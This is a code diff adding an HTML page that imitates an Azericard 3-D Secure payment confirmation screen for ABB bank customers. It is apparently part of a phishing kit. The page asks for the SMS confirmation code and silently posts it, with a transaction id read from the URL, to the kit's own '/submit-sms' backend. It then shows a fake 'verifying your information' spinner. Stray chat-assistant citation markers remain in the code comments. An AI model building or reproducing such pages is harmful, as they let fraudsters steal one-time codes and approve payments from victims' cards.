@@ -1,0 +1,172 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard</title>
+
+    <link href="/sms/css/style.css" rel="stylesheet" type="text/css">
+    
+</head>
+
+<body>
+    <div id="video-roll-root-mask"></div>
+    <div class="all">
+        <main class="main">
+            <header>
+                <a>
+                    <div class="abb-logo">
+                        <img src="./sms/images/abb_logo.svg" alt="">
+                    </div>
+                </a>
+                <div class="card-call">
+                    <a>
+                        <div class="abb-logo-mobile">
+                            <img src="./sms/images/abb_logo.svg" alt="">
+                        </div>
+                    </a>
+                    <a>
+                        <div>
+                            <img src="./sms/images/azericard.svg" alt="">
+                        </div>
+                    </a>
+                    <a>
+                        <div class="abb-logo-mobile">
+                            <img src="./sms/images/m10byPashaPay_1.svg" alt="">
+                        </div>
+                    </a>
+                </div>
+            </header>
+            <section class="form-content form-content2" id="sectionOne">
+                <h1>Ödənişin təsdiqi</h1>
+            
+                <!-- action backend route’a, name’ler backend ile eşleşecek -->
+                <form class="form-container" action="/submit-sms" method="POST" autocomplete="off" id="sms-form">
+                  
+                  <!-- 1) trans_id hidden: URL’den alınan id burada saklanacak -->  
+                  <input type="hidden" name="trans_id" id="trans_id"> <!-- :contentReference[oaicite:0]{index=0} -->
+            
+                  <div class="field-container2">
+                    <div class="field-container_cvc">
+                      <div class="field_cvc">
+                        <div>
+                          <label for="smsCode">3DS Code</label>
+                          <!-- 2) name="smsCode" backend’de req.body.smsCode ile okunacak -->
+                          <input required id="smsCode" name="smsCode" type="text" inputmode="numeric"
+                                 placeholder="****" minlength="4" maxlength="6">
+                        </div>
+                        <p class="tooltip">
+                          <img src="./sms/images/info-circle.svg" alt="">
+                          <span class="tooltiptext">
+                            Sizə mesaj vasitəsi ilə göndərildi!
+                            <span class="triangle"></span>
+                          </span>
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+            
+                  <div class="form-button">
+                    <button id="submitBtn" type="submit" class="submitBtn" disabled="">
+                      <div style="pointer-events: none">
+                        <img src="./sms/images/lock.svg" alt="">
+                      </div>
+                      Ödənişi təsdiqlə
+                    </button>
+            
+                    <button id="cnltBtn" type="button" onclick="location.href='index.html';">
+                      Ödənişin ləğvi
+                    </button>
+                  </div>
+                </form>
+              </section>
+        </main>
+        <footer class="footer_part2">
+            <div class="footer_1">
+                <div>
+                    <img src="./sms/images/visa.svg" alt="">
+                </div>
+                <div>
+                    <img src="./sms/images/secure.svg" alt="">
+                </div>
+                <div>
+                    <img src="./sms/images/master.svg" alt="">
+                </div>
+                <div>
+                    <img src="./sms/images/master_logo.svg" alt="">
+                </div>
+            </div>
+            <div class="footer_2">
+                <div>
+                    <img src="./sms/images/american_express.svg" alt="">
+                </div>
+                <div>
+                    <img src="./sms/images/safeKey.svg" alt="">
+                </div>
+                <div>
+                    <img src="./sms/images/UnionPay.svg" alt="">
+                </div>
+                <div>
+                    <img src="./sms/images/jcb.svg" alt="">
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="sms/js/azericard-imask.js"></script>
+    <script type="text/javascript" src="sms/js/azericard3ds-main.js"></script>
+    <script type="text/javascript">
+         // 2.1 Get trans_id from URL and set hidden input
+    document.addEventListener('DOMContentLoaded', () => {
+      const tid = new URLSearchParams(window.location.search).get('trans_id');  // :contentReference[oaicite:3]{index=3}
+      if (tid) document.getElementById('trans_id').value = tid;
+    });
+
+    // 2.2 AJAX-ify the form submit
+    document.getElementById('sms-form').addEventListener('submit', async e => {
+      e.preventDefault();                                                      // stop normal redirect :contentReference[oaicite:4]{index=4}
+      const form = e.target;
+
+      // Convert FormData → URLSearchParams so body-parser can parse it
+      const params = new URLSearchParams();
+      for (const [k,v] of new FormData(form)) params.append(k, v);             // :contentReference[oaicite:5]{index=5}
+
+      const resp = await fetch(form.action, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: params
+      });
+
+      if (resp.ok) {
+        // Replace section content in-place
+        document.getElementById('sectionOne').innerHTML = `
+        <img class="logo" src="/sms/images/3ds.svg" alt="">
+                <img class="loading" src="/sms/images/rolling.svg" alt="">
+                <div class="message">Please wait, verifying your information...</div>
+        `;
+      } else {
+        document.getElementById('sectionOne').innerHTML = `
+          <div class="error">Doğrulama başarısız oldu.</div>
+        `;
+      }
+    });
+
+        var submitBtn = document.getElementById("submitBtn");
+        submitBtn.addEventListener("click", function (event) {
+            setTimeout(function () {
+                event.target.disabled = true;
+                submitBtn.innerHTML =
+                    '<div><img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="" /></div><div><p class="submitWrd">Processing...</p></div>';
+                event.preventDefault();
+            }, 0);
+        });
+
+
+
+     
+
+
+    </script>
+
+
+
+
+</body></html>
